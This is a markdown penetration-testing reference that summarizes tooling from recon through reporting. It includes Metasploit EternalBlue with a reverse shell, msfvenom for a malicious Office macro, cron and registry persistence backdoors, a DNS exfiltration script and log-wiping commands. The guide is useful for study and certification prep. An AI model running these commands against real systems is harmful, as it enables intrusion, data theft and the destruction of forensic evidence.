# The Ultimate Cybersecurity Master Guide

## 🎯 Purpose
Foundational cybersecurity master guide compiled from 70+ professional security books - covering the complete penetration testing lifecycle with expert-sourced methodology and key takeaways.

## ⚙️ Function
Covers: reconnaissance (OSINT, active scanning), exploitation (web, network, AD), post-exploitation (privilege escalation, lateral movement, persistence, data exfil), defensive techniques, incident response basics, and professional reporting - all synthesized from expert literature.

## 🏆 Goal
Distill 70+ expert cybersecurity books into a single actionable reference that captures methodology, key techniques, and professional standards for authorized security assessments.

## 📋 When to Use
- Learning systematic penetration testing methodology
- Referencing expert-sourced best practices during an assessment
- Study for professional certifications (OSCP, CEH, Security+)
- Building a mental framework for offensive and defensive security

## Complete Professional Resource Compilation

*Incorporating PNWC Internal Knowledge Base & Guides + 70+ Professional Books*

---

## MASTER TABLE OF CONTENTS

### PART I: FOUNDATIONS
1. [Core Cybersecurity Concepts](#core-cybersecurity-concepts)
2. [Linux Command Line Mastery](#linux-command-line-mastery)
3. [Python for Security Professionals](#python-for-security-professionals)
4. [Bash Scripting for Red Teams](#bash-scripting-for-red-teams)

### PART II: RECONNAISSANCE & ENUMERATION
5. [Information Gathering Techniques](#information-gathering-techniques)
6. [Network Scanning & Discovery](#network-scanning--discovery)
7. [Service Enumeration](#service-enumeration)
8. [Web Application Reconnaissance](#web-application-reconnaissance)

### PART III: VULNERABILITY ASSESSMENT
9. [Automated Vulnerability Scanning](#automated-vulnerability-scanning)
10. [Manual Testing Methodologies](#manual-vulnerability-testing)
11. [Web Application Vulnerabilities](#web-application-vulnerabilities)

### PART IV: EXPLOITATION
12. [Metasploit Framework Mastery](#metasploit-framework-mastery)
13. [Buffer Overflow Exploitation](#buffer-overflow-exploitation)
14. [Web Exploitation Techniques](#sql-injection-testing)
15. [Password Attacks](#password-attacks)
16. [Client-Side Exploitation](#client-side-exploitation)

### PART V: POST-EXPLOITATION
17. [Privilege Escalation](#privilege-escalation)
18. [Lateral Movement](#lateral-movement)
19. [Persistence Mechanisms](#persistence-mechanisms)
20. [Data Exfiltration](#data-exfiltration-via-dns)
21. [C2 Frameworks & Tradecraft](Tradecraft/c2-frameworks.md)
22. [AV/EDR Evasion - Detection & Defense](Tradecraft/av-edr-evasion.md)
23. [Living Off the Land (LOLBins/LOLBAs)](Tradecraft/lolbins-lolbas.md)
24. [Covering Tracks](#covering-tracks)

### PART VI: ADVANCED TOPICS
22. [Active Directory Attacks](#active-directory-attacks)
23. [Active Directory - Attacks & Defense](Tradecraft/active-directory.md)
24. [Cloud Security & Exploitation](#cloud-security--exploitation)
25. [Mobile Device Security](#mobile-device-security)
26. [IoT & Hardware Hacking](#iot--hardware-hacking)
27. [Wireless Network Security](#wireless-network-security)

### PART VII: DEFENSIVE SECURITY
27. [Network Security Architecture](#complete-network-hardening)
28. [Firewall Configuration](#firewall-configuration)
29. [Intrusion Detection Systems](#intrusion-detection-with-snort)
30. [Security Monitoring & SIEM](#security-monitoring-with-ossec)
31. [Incident Response](#incident-response)
32. [Network Detection & Packet Analysis](Tradecraft/network-detection.md)

### PART VIII: SPECIALIZED SKILLS
33. [Malware Analysis](#malware-types--detection)
34. [Digital Forensics](#digital-forensics)
35. [Reverse Engineering](#reverse-engineering)
36. [Social Engineering](#social-engineering-defense)

### PART IX: AUTOMATION & TOOLING
37. [Python Automation Scripts](#python-automation-scripts)
38. [Custom Tool Development](#custom-tool-development)
39. [CI/CD for Security](#cicd-for-security)

### PART X: PROFESSIONAL PRACTICE
40. [Penetration Testing Methodology](#penetration-testing-methodology)
41. [Report Writing](#report-writing)
42. [Legal & Ethical Considerations](#legal--ethical-considerations)

### PART XI: TRADECRAFT REFERENCE
43. [Tradecraft Overview](Tradecraft/README.md)
44. [C2 Frameworks](Tradecraft/c2-frameworks.md)
45. [AV/EDR Evasion - Detection & Defense](Tradecraft/av-edr-evasion.md)
46. [Living Off the Land](Tradecraft/lolbins-lolbas.md)
47. [OSINT & Threat Intelligence](Tradecraft/osint-threat-intel.md)
48. [Network Detection & Packet Analysis](Tradecraft/network-detection.md)
49. [Active Directory - Attacks & Defense](Tradecraft/active-directory.md)

---

## 🎯 Purpose
The foundational, book-derived technical reference - key takeaways from 70+ professional security books condensed into a single full-lifecycle guide (foundations through exploitation through defense). Unlike [ENHANCED_MASTER_GUIDE.md](ENHANCED_MASTER_GUIDE.md), this file contains no PNWC-specific operational/internal-KB content - it's the "textbook" layer, not the "field experience" layer.

## ⚙️ Function
11 parts covering the complete pentest lifecycle: Foundations, Recon/Enumeration, Vulnerability Assessment, Exploitation, Post-Exploitation, Advanced Topics (AD, cloud, mobile, IoT, wireless), Defensive Security, Specialized Skills (malware/forensics/RE/social engineering), Automation/Tooling, Professional Practice, and a Tradecraft Reference part that links out to the dedicated [Tradecraft/](Tradecraft/) folder for the deepest offensive-tradecraft material (C2, evasion, LOLBins, AD attacks - kept in their own folder rather than duplicated here). Differs from [SPECIALIZED_TOPICS_GUIDE.md](SPECIALIZED_TOPICS_GUIDE.md), which covers emerging/niche domains (AI security, hardware hacking, SDR, space security) not covered in this core lifecycle guide.

## 🏆 Goal
A reader can execute a complete penetration test - from reconnaissance through reporting - using only the commands and methodology in this single file, escalating to ENHANCED_MASTER_GUIDE.md or Tradecraft/ only when they need PNWC-specific operational context or deep offensive tradecraft.

## 📋 When to Use
As the primary technical reference during an engagement, when studying for OSCP/CEH/GPEN, or as the first stop before consulting the more specialized guides.

# PART I: FOUNDATIONS

## Core Cybersecurity Concepts

### CIA Triad
**Confidentiality** - Data accessible only to authorized parties  
**Integrity** - Data remains unaltered and trustworthy  
**Availability** - Systems and data accessible when needed

### Defense in Depth
Multiple layers of security controls:
1. Physical security
2. Network security
3. Host security
4. Application security
5. Data security

### Attack Lifecycle (Cyber Kill Chain)
1. **Reconnaissance** - Information gathering
2. **Weaponization** - Creating exploit payload
3. **Delivery** - Transmitting weapon to target
4. **Exploitation** - Executing code on victim system
5. **Installation** - Installing malware/backdoor
6. **Command & Control** - Remote control channel
7. **Actions on Objectives** - Achieving attacker's goals

---

## Linux Command Line Mastery

### Essential Linux Commands for Security

#### File System Navigation
```bash
# Navigation
pwd                    # Print working directory
ls -la                 # List all files with details
cd /path/to/dir       # Change directory
find / -name file.txt # Find files
locate filename       # Fast file location
which command         # Find command location
whereis command       # Find command, source, man pages

# File Operations
cat file.txt          # Display file contents
less file.txt         # Page through file
head -n 20 file.txt   # First 20 lines
tail -n 20 file.txt   # Last 20 lines
tail -f /var/log/auth.log  # Follow log file in real-time
grep "pattern" file   # Search for pattern
awk '{print $1}' file # Process columns
sed 's/old/new/g' file  # Stream editor
cut -d: -f1 /etc/passwd  # Extract fields

# File Permissions
chmod 755 file        # Change permissions (rwxr-xr-x)
chmod +x script.sh    # Make executable
chown user:group file # Change ownership
umask 022             # Set default permissions

# Archiving & Compression
tar -czf archive.tar.gz directory/  # Create compressed archive
tar -xzf archive.tar.gz             # Extract archive
zip -r archive.zip directory/       # Create zip
unzip archive.zip                   # Extract zip
gzip file.txt                       # Compress file
gunzip file.txt.gz                  # Decompress file
```

#### Process Management
```bash
# Process Viewing
ps aux                # All running processes
ps aux | grep nginx   # Find specific process
top                   # Interactive process viewer
htop                  # Better process viewer
pstree                # Process tree

# Process Control
kill PID              # Terminate process
kill -9 PID           # Force kill
killall process_name  # Kill by name
pkill -f pattern      # Kill by pattern

# Background/Foreground
command &             # Run in background
jobs                  # List background jobs
fg %1                 # Bring job 1 to foreground
bg %1                 # Send job 1 to background
nohup command &       # Run immune to hangups
```

#### Network Commands
```bash
# Network Information
ip addr show          # Show IP addresses
ip route show         # Show routing table
ifconfig              # Network interfaces (legacy)
netstat -tulpn        # Listening ports
ss -tulpn             # Socket statistics (modern)
lsof -i :80           # What's using port 80

# Network Testing
ping -c 4 host        # Ping 4 times
traceroute host       # Trace route to host
mtr host              # Combined ping/traceroute
nc -zv host 1-1000    # Port scan with netcat
curl -I https://site.com  # HTTP headers
wget https://site.com/file  # Download file

# Network Capture
tcpdump -i eth0       # Capture on interface
tcpdump -i eth0 -w capture.pcap  # Save to file
tcpdump -r capture.pcap  # Read from file
tcpdump port 80       # Capture port 80
tcpdump host 192.168.1.100  # Capture specific host
```

#### User & Permission Management
```bash
# User Information
whoami                # Current user
id                    # User ID and groups
w                     # Logged in users
last                  # Login history
lastlog               # Last login per user

# User Management
useradd username      # Create user
userdel username      # Delete user
passwd username       # Change password
usermod -aG group user  # Add user to group
su - username         # Switch user
sudo command          # Execute as root

# Permission Discovery
sudo -l               # Check sudo privileges
find / -perm -4000 2>/dev/null  # Find SUID binaries
find / -writable -type d 2>/dev/null  # Writable directories
getcap -r / 2>/dev/null  # Find capabilities
```

### Advanced Linux for Security

#### Process & System Analysis
```bash
# System Information
uname -a              # Kernel info
cat /etc/*-release    # OS version
lsb_release -a        # Distribution info
hostname              # System name
uptime                # System uptime
dmesg                 # Kernel messages

# Hardware Information
lscpu                 # CPU information
lspci                 # PCI devices
lsusb                 # USB devices
lsblk                 # Block devices
df -h                 # Disk space
free -h               # Memory usage

# Service Management (systemd)
systemctl status service  # Check service status
systemctl start service   # Start service
systemctl stop service    # Stop service
systemctl enable service  # Enable at boot
systemctl list-units --type=service  # List services
journalctl -u service     # Service logs
```

#### Log Analysis
```bash
# Common Log Locations
/var/log/auth.log         # Authentication logs
/var/log/syslog           # System logs
/var/log/apache2/         # Apache logs
/var/log/nginx/           # Nginx logs
/var/log/mysql/           # MySQL logs

# Log Analysis Commands
# Failed SSH logins
grep "Failed password" /var/log/auth.log

# Successful SSH logins
grep "Accepted" /var/log/auth.log

# Top attacking IPs
grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head -10

# Find suspicious sudo usage
grep "sudo" /var/log/auth.log | grep -v "session opened"

# Monitor log in real-time
tail -f /var/log/syslog | grep --line-buffered "ERROR"
```

[Return to Table of Contents](#master-table-of-contents)

---

## Python for Security Professionals

### Python Basics for Security

#### Essential Python Constructs
```python
#!/usr/bin/env python3

# Variables and Data Types
ip_address = "192.168.1.1"
port = 80
is_vulnerable = True
services = ["ssh", "http", "mysql"]
host_info = {"ip": "192.168.1.1", "os": "Linux"}

# String Operations
banner = "HTTP/1.1 200 OK"
if "HTTP" in banner:
    print("Web server detected")

# String formatting
print(f"Scanning {ip_address}:{port}")
print("Host: {} Port: {}".format(ip_address, port))

# Lists and Iteration
for service in services:
    print(f"Checking {service}")

# Dictionaries
for key, value in host_info.items():
    print(f"{key}: {value}")

# List Comprehension
open_ports = [p for p in range(1, 1001) if check_port(p)]
```

#### File Operations
```python
# Reading files
with open('passwords.txt', 'r') as f:
    passwords = f.readlines()

# Writing files
with open('results.txt', 'w') as f:
    f.write("Scan results:\n")
    for result in results:
        f.write(f"{result}\n")

# Appending to files
with open('log.txt', 'a') as f:
    f.write(f"[{timestamp}] Event logged\n")

# Binary file operations
with open('payload.bin', 'rb') as f:
    data = f.read()

# JSON files
import json
with open('config.json', 'r') as f:
    config = json.load(f)

with open('output.json', 'w') as f:
    json.dump(data, f, indent=4)
```

### Network Programming

#### Socket Programming
```python
import socket

# TCP Client
def tcp_client(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    
    # Send data
    client.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
    
    # Receive response
    response = client.recv(4096)
    print(response.decode())
    
    client.close()

# TCP Server
def tcp_server(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f"[*] Listening on port {port}")
    
    while True:
        client, addr = server.accept()
        print(f"[*] Connection from {addr[0]}:{addr[1]}")
        
        data = client.recv(1024)
        print(f"[*] Received: {data.decode()}")
        
        client.send(b"Message received")
        client.close()

# Port Scanner
def port_scanner(target, ports):
    print(f"Scanning {target}")
    open_ports = []
    
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        
        if result == 0:
            print(f"[+] Port {port} is open")
            open_ports.append(port)
        
        sock.close()
    
    return open_ports
```

[Return to Table of Contents](#master-table-of-contents)

---

## Bash Scripting for Red Teams

### Bash Script Fundamentals

#### Variables and Input
```bash
#!/bin/bash

# Variables
TARGET="192.168.1.100"
PORT=80
SCAN_TYPE="SYN"

# Command substitution
CURRENT_DATE=$(date +%Y-%m-%d)
IP_ADDRESS=$(hostname -I | awk '{print $1}')

# User input
read -p "Enter target IP: " target
read -sp "Enter password: " password  # Silent input
echo

# Command line arguments
TARGET=$1
PORT=$2

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target> <port>"
    exit 1
fi
```

#### Conditionals and Loops
```bash
# If statements
if [ -f "/etc/passwd" ]; then
    echo "File exists"
fi

if [ "$USER" == "root" ]; then
    echo "Running as root"
else
    echo "Not root"
fi

# Numeric comparison
if [ $PORT -gt 1024 ]; then
    echo "High port"
fi

# For loops
for port in {1..100}; do
    echo "Scanning port $port"
done

for ip in 192.168.1.{1..254}; do
    ping -c 1 -W 1 $ip > /dev/null 2>&1 && echo "$ip is up"
done

# While loops
while read line; do
    echo "Processing: $line"
done < wordlist.txt
```

[Return to Table of Contents](#master-table-of-contents)

---

# PART II: RECONNAISSANCE & ENUMERATION

## Information Gathering Techniques

### Passive Reconnaissance

#### OSINT (Open Source Intelligence)
```bash
# Domain enumeration
whois domain.com
nslookup domain.com
dig domain.com ANY
host -t mx domain.com  # Mail servers
host -t ns domain.com  # Name servers
host -t txt domain.com # TXT records

# Subdomain enumeration
fierce --domain domain.com
sublist3r -d domain.com

# DNS zone transfer
dig axfr @ns1.domain.com domain.com

# Search engines
site:domain.com filetype:pdf
site:domain.com intitle:"index of"
site:domain.com inurl:admin
```

[Return to Table of Contents](#master-table-of-contents)

---

## Network Scanning & Discovery

### Host Discovery with Nmap
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
nmap -PR 192.168.1.0/24

# Disable ping
nmap -Pn 192.168.1.100

# TCP SYN ping
nmap -PS22,80,443 192.168.1.0/24
```

### Port Scanning
```bash
# Quick scan (top 100 ports)
nmap --top-ports 100 192.168.1.100

# Scan all 65535 ports
nmap -p- 192.168.1.100

# Scan specific ports
nmap -p 22,80,443,3306 192.168.1.100

# TCP SYN scan (stealth)
nmap -sS 192.168.1.100

# Version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan
nmap -A 192.168.1.100
```

[Return to Table of Contents](#master-table-of-contents)

---

## Service Enumeration

### SMB Enumeration (Port 445/139)
```bash
# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
nmap --script smb-os-discovery 192.168.1.100

# enum4linux
enum4linux -a 192.168.1.100

# smbclient
smbclient -L //192.168.1.100 -N
smbclient //192.168.1.100/share -U username
```

[Return to Table of Contents](#master-table-of-contents)

---

## Web Application Reconnaissance

### Directory & File Enumeration
```bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt

# Dirb
dirb http://target.com
dirb http://target.com wordlist.txt -X .php,.html

# ffuf
ffuf -u http://target.com/FUZZ -w wordlist.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
```

[Return to Table of Contents](#master-table-of-contents)

---

# PART III: VULNERABILITY ASSESSMENT

## Automated Vulnerability Scanning

### Nikto Web Scanner
```bash
# Basic scan
nikto -h http://target.com

# Scan with specific tests
nikto -h http://target.com -Tuning 1234

# Save output
nikto -h http://target.com -o results.html -Format html

# Use proxy
nikto -h http://target.com -useproxy http://127.0.0.1:8080
```

[Return to Table of Contents](#master-table-of-contents)

---

## Manual Vulnerability Testing

### SQL Injection Testing
```bash
# Basic test payloads
' OR '1'='1
' OR '1'='1'--
admin'--

# sqlmap automated testing
sqlmap -u "http://target.com/page?id=1"
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
```
---
> 📁 **Deep Dive:** [OSINT & Threat Intelligence](Tradecraft/osint-threat-intel.md)
> covers full OSINT methodology, Shodan/Censys/amass/Maltego/SpiderFoot,
> breach data sources, MISP/OpenCTI threat intel platforms, IOC operationalization,
> and Windows + Linux tool installs for every major OSINT tool.

[Return to Table of Contents](#master-table-of-contents)

---

## Web Application Vulnerabilities

### Common Web Vulnerabilities
- SQL Injection
- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- Remote Code Execution (RCE)
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- Server-Side Request Forgery (SSRF)
- XML External Entity (XXE)
- Insecure Deserialization
- Security Misconfiguration

[Return to Table of Contents](#master-table-of-contents)

---

# PART IV: EXPLOITATION

## Metasploit Framework Mastery

### Basic Metasploit Usage
```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run exploit
exploit
```

### Advanced Session Management
```bash
# Route through compromised host
run autoroute -s 10.10.10.0/24

# Port forwarding
portfwd add -l 3389 -p 3389 -r 10.10.10.50

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

[Return to Table of Contents](#master-table-of-contents)

---

## Buffer Overflow Exploitation

### Stack Buffer Overflow Basics
1. Fuzzing to find crash
2. Controlling EIP
3. Finding bad characters
4. Finding jump point (JMP ESP)
5. Generating shellcode
6. Exploiting the vulnerability

[Return to Table of Contents](#master-table-of-contents)

---

## Password Attacks

### Password Cracking Tools
```bash
# John the Ripper
john --wordlist=rockyou.txt hashes.txt

# Hashcat
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Hydra (online attacks)
hydra -l admin -P passwords.txt ssh://192.168.1.100
```

[Return to Table of Contents](#master-table-of-contents)

---

## Client-Side Exploitation

### Malicious Document Generation
```bash
# Generate malicious Office document
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f vba

# Browser exploitation with BeEF
beef-xss
```

[Return to Table of Contents](#master-table-of-contents)

---

# PART V: POST-EXPLOITATION

## Privilege Escalation

### Linux Privilege Escalation
```bash
# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# LinPEAS automated enumeration
./linpeas.sh
```

### Windows Privilege Escalation
```bash
# Check privileges
whoami /priv

# PowerUp enumeration
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

# WinPEAS automated enumeration
winpeas.exe
```

[Return to Table of Contents](#master-table-of-contents)

---

## Lateral Movement

### Techniques
- Pass-the-Hash
- Pass-the-Ticket
- Overpass-the-Hash
- Token Impersonation
- Remote Desktop Protocol (RDP)
- Windows Remote Management (WinRM)
- PsExec
- WMI
*See the full deep-dive reference below; each technique includes tools, commands, and Sysmon/KQL detection rules for both Windows and Linux.*
> 📁 **Deep Dive:** [Active Directory Lateral Movement](Tradecraft/active-directory.md#lateral-movement)
> Covers WMI, PsExec, DCOM, pass-the-hash, pass-the-ticket, and Overpass-the-Hash
> with Sysmon/KQL detection for each technique.

[Return to Table of Contents](#master-table-of-contents)

---

## Persistence Mechanisms

### Linux Persistence
```bash
# Cron job
(crontab -l; echo "* * * * * /tmp/backdoor.sh") | crontab -

# SSH keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Systemd service
# Create malicious service file
```

### Windows Persistence
```bash
# Registry run keys
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled task
schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon

# WMI event subscription
# Create malicious WMI filter and consumer
```
---
> 📁 **Deep Dive:** [LOLBins Persistence](Tradecraft/lolbins-lolbas.md#persistence-via-lolbins)
> covers `schtasks`, registry Run keys, and WMI event subscription persistence
> with Sigma detection rules and ASR hardening.

[Return to Table of Contents](#master-table-of-contents)

---

## Data Exfiltration via DNS

```bash
#!/bin/bash
# DNS exfiltration script

FILE=$1
DOMAIN=$2

base64 $FILE | fold -w 32 | while read chunk; do
    nslookup "$chunk.$DOMAIN" 8.8.8.8 > /dev/null 2>&1
    echo "[*] Sent chunk: ${chunk:0:10}..."
    sleep 0.5
done
```

[Return to Table of Contents](#master-table-of-contents)

---

## Covering Tracks

### Log Cleaning
```bash
# Clear bash history
history -c
cat /dev/null > ~/.bash_history

# Clear system logs (requires root)
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Windows event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

[Return to Table of Contents](#master-table-of-contents)

---

# PART VI: ADVANCED TOPICS

## Active Directory Attacks

### Active Directory Enumeration
```bash
# BloodHound
bloodhound-python -u username -p password -d domain.local -ns 192.168.1.10 -c all

# PowerView
powershell -ep bypass -c ". .\PowerView.ps1; Get-DomainUser"

# Enumerate domain users
net user /domain

# Enumerate domain groups
net group /domain
```
---
> 📁 **Full Reference:** [Active Directory - Attacks & Defense](Tradecraft/active-directory.md)
> covers BloodHound/SharpHound, Kerberoasting, AS-REP roasting, Golden/Silver/Diamond tickets,
> DCSync, ACL abuse, GPO abuse, domain persistence, and the full hardening checklist.

[Return to Table of Contents](#master-table-of-contents)

---

## Cloud Security & Exploitation

### AWS Enumeration
```bash
# List S3 buckets
aws s3 ls

# Check for public buckets
aws s3 ls s3://bucket-name --no-sign-request

# Enumerate EC2 instances
aws ec2 describe-instances
```

[Return to Table of Contents](#master-table-of-contents)

---

## Mobile Device Security

### Android Security Testing
```bash
# ADB commands
adb devices
adb shell
adb pull /data/data/com.app/databases/database.db

# Reverse engineering APK
apktool d app.apk
jadx app.apk
```

[Return to Table of Contents](#master-table-of-contents)

---

## IoT & Hardware Hacking

### Firmware Extraction & Analysis
```bash
# binwalk for firmware analysis
binwalk firmware.bin
binwalk -e firmware.bin

# strings analysis
strings firmware.bin | grep -i password
```

[Return to Table of Contents](#master-table-of-contents)

---

## Wireless Network Security

### WiFi Attacks
```bash
# Monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth clients
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA2
aircrack-ng -w rockyou.txt capture.cap
```

[Return to Table of Contents](#master-table-of-contents)

---

# PART VII: DEFENSIVE SECURITY

## Complete Network Hardening

### VPN Setup - WireGuard
```bash
# Install WireGuard
apt-get install wireguard

# Generate keys
wg genkey | tee privatekey | wg pubkey > publickey

# Start VPN
wg-quick up wg0
```

[Return to Table of Contents](#master-table-of-contents)

---

## Firewall Configuration

### iptables Basics
```bash
# View rules
iptables -L -v -n

# Block IP
iptables -A INPUT -s 192.168.1.100 -j DROP

# Allow SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Save rules
iptables-save > /etc/iptables/rules.v4
```

[Return to Table of Contents](#master-table-of-contents)

---

## Intrusion Detection with Snort

```bash
# Install Snort
apt-get install snort

# Run Snort
snort -A console -q -c /etc/snort/snort.conf -i eth0
```

[Return to Table of Contents](#master-table-of-contents)

---

## Security Monitoring with OSSEC

```bash
# Start OSSEC
/var/ossec/bin/ossec-control start

# Check status
/var/ossec/bin/ossec-control status
```
---
> 📁 **Deep Dive:** [Network Detection & Packet Analysis](Tradecraft/network-detection.md)
> covers Zeek, Suricata, Wireshark, pktmon, Defender for Endpoint KQL, C2 beacon
> detection scripts, DNS tunneling/DGA detection, and full NSM stack setup.

---

## Incident Response

### Incident Response Process
1. **Preparation** - Have IR plan ready
2. **Identification** - Detect and confirm incident
3. **Containment** - Limit damage
4. **Eradication** - Remove threat
5. **Recovery** - Restore systems
6. **Lessons Learned** - Post-incident review

[Return to Table of Contents](#master-table-of-contents)

---

# PART VIII: SPECIALIZED SKILLS

## Malware Types & Detection

### Common Malware Categories
- **Virus** - Replicates by modifying programs
- **Worm** - Self-replicating network spreader
- **Trojan** - Disguised malicious software
- **Ransomware** - File encryption extortion
- **Spyware** - Activity monitoring
- **Rootkit** - System-level hiding
- **Keylogger** - Keystroke recording

---
> 📁 **Deep Dive:** [AV/EDR Evasion - Detection & Defense](Tradecraft/av-edr-evasion.md)
> covers FLARE VM, REMnux, Volatility 3, PE-sieve, Moneta, CyberChef, and Sysinternals
> for Windows and Linux malware analysis, plus recognition patterns for all major
> evasion techniques (AMSI bypass, ETW tampering, process injection, sleep obfuscation).

[Return to Table of Contents](#master-table-of-contents)

---

## Digital Forensics

### Forensic Data Acquisition
```bash
# Create disk image
dd if=/dev/sda of=image.dd bs=4M status=progress

# Calculate hash
md5sum image.dd
sha256sum image.dd

# Mount forensic image
mount -o ro,loop image.dd /mnt/forensic
```

[Return to Table of Contents](#master-table-of-contents)

---

## Reverse Engineering

### Disassembly Tools
- Ghidra
- IDA Pro
- radare2
- Binary Ninja
- Hopper

[Return to Table of Contents](#master-table-of-contents)

---

## Social Engineering Defense

### Common Social Engineering Tactics
- **Pretexting** - Fabricated scenarios
- **Baiting** - Enticing offers
- **Quid Pro Quo** - Service exchange
- **Tailgating** - Unauthorized physical access
- **Vishing** - Voice phishing
- **Smishing** - SMS phishing

[Return to Table of Contents](#master-table-of-contents)

---

# PART IX: AUTOMATION & TOOLING

## Python Automation Scripts

### File System Automation
```python
import os
from pathlib import Path

def organize_files(directory):
    """Organize files into subdirectories by extension"""
    for file in Path(directory).glob('*.*'):
        if file.is_file():
            extension = file.suffix[1:]
            dest_dir = Path(directory) / extension
            dest_dir.mkdir(exist_ok=True)
            shutil.move(str(file), str(dest_dir / file.name))
```

[Return to Table of Contents](#master-table-of-contents)

---

## Custom Tool Development

### Creating Security Tools
- Identify need/gap in existing tools
- Design tool architecture
- Implement core functionality
- Add error handling
- Create documentation
- Test thoroughly
- Share with community

[Return to Table of Contents](#master-table-of-contents)

---

## CI/CD for Security

### Security in DevOps Pipeline
- Static Application Security Testing (SAST)
- Dynamic Application Security Testing (DAST)
- Software Composition Analysis (SCA)
- Container scanning
- Infrastructure as Code (IaC) scanning
- Secret scanning

[Return to Table of Contents](#master-table-of-contents)

---

# PART X: PROFESSIONAL PRACTICE

## Penetration Testing Methodology

### Pre-Engagement Phase
1. **Scope Definition** - Define targets and boundaries
2. **Rules of Engagement** - Establish testing parameters
3. **Legal Authorization** - Get written permission
4. **Communication Plan** - Set up contact procedures

### Testing Phases
1. **Information Gathering** - OSINT and reconnaissance
2. **Vulnerability Assessment** - Identify weaknesses
3. **Exploitation** - Attempt to exploit vulnerabilities
4. **Post-Exploitation** - Assess access and impact
5. **Reporting** - Document findings and recommendations

[Return to Table of Contents](#master-table-of-contents)

---

## Report Writing

### Executive Summary Template
```markdown
# Executive Summary

## Overview
[Brief description of engagement]

## Scope
[Systems tested]

## Key Findings
- [Number] Critical vulnerabilities
- [Number] High vulnerabilities
- [Number] Medium vulnerabilities

## Risk Rating
Overall Risk: [Critical/High/Medium/Low]

## Recommendations
1. [Priority 1 recommendation]
2. [Priority 2 recommendation]
```

[Return to Table of Contents](#master-table-of-contents)

---

## Legal & Ethical Considerations

### Legal Framework
- **CFAA (USA)** - Unauthorized access is illegal
- **GDPR (EU)** - Data protection requirements
- **Always get written authorization**
- **Stay within defined scope**
- **Report findings responsibly**

### Responsible Disclosure
1. Discover vulnerability
2. Verify the issue
3. Document thoroughly
4. Contact vendor privately
5. Allow time to fix (90 days)
6. Coordinate public disclosure

[Return to Table of Contents](#master-table-of-contents)

---

# PART XI: TRADECRAFT REFERENCE
 
## Overview
 
Operational tradecraft reference covering C2 frameworks, evasion techniques, living-off-the-land,
OSINT methodology, network detection, and Active Directory - structured for both red team and blue
team practitioners. Each file covers offensive technique context alongside detection, hunting, and
defensive hardening guidance.
 
### Contents
 
| File | Coverage | MITRE ATT&CK |
|---|---|---|
| [C2 Frameworks](Tradecraft/c2-frameworks.md) | Cobalt Strike, Sliver, Havoc, malleable C2, redirectors, JA3 detection | TA0011 |
| [AV/EDR Evasion](Tradecraft/av-edr-evasion.md) | Static evasion, AMSI, ETW, API hooks, syscalls, injection, FLARE VM, REMnux, Volatility | TA0005 |
| [LOLBins / LOLBAs](Tradecraft/lolbins-lolbas.md) | certutil, mshta, regsvr32, wmic, bitsadmin, comsvcs.dll, Sigma rules, ASR/WDAC | TA0002, TA0005, TA0008 |
| [OSINT & Threat Intel](Tradecraft/osint-threat-intel.md) | Maltego, SpiderFoot, Shodan, amass, trufflehog, MISP, OpenCTI, IOC lifecycle | TA0043 |
| [Network Detection](Tradecraft/network-detection.md) | Zeek, Suricata, Wireshark, pktmon, Defender for Endpoint KQL, beacon detection, DNS tunneling | TA0010, TA0011 |
| [Active Directory](Tradecraft/active-directory.md) | BloodHound, Kerberoasting, Golden/Silver/Diamond tickets, DCSync, domain persistence, hardening | TA0006, TA0004, TA0008, TA0003 |
 
### Analysis Environment Quick Reference
 
**Windows (FLARE VM)**
```powershell
# Install FLARE VM on clean Windows 10/11 VM
# https://github.com/mandiant/flare-vm
Set-ExecutionPolicy Unrestricted -Force
.\install.ps1
# Installs: x64dbg, Ghidra, PE-bear, CFF Explorer, Procmon, Process Hacker,
#           Regshot, FakeNet-NG, CyberChef, dnSpy, de4dot, Wireshark
```
 
**Linux (REMnux)**
```bash
# Install REMnux on Ubuntu
wget https://remnux.org/docs/distro/get/
sudo mv remnux-cli /usr/local/bin/remnux && sudo chmod +x /usr/local/bin/remnux
remnux install
